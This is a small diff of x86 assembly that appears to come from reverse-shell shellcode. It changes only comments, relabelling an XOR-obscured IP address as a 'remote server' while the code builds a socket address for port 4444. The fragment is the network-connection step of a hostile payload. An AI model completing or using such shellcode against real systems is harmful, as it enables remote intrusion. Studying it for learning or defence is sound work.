@@ -13,9 +13,9 @@ section .text
     ; create sockaddr_in struct
     push  eax
     push  eax             ; [$esp]: 8 bytes of padding
-    mov   ebx, 0xc405210a 
+    mov   ebx, 0xc405210a ; Remote server IP
     xor   ebx, eax
-    push  ebx             ; [$esp]: 127.0.0.1
+    push  ebx             ; [$esp]: IP
     push  word 0x5c11     ; [$esp]: 4444
     push  word 0x02       ; [$esp]: AF_INET
 
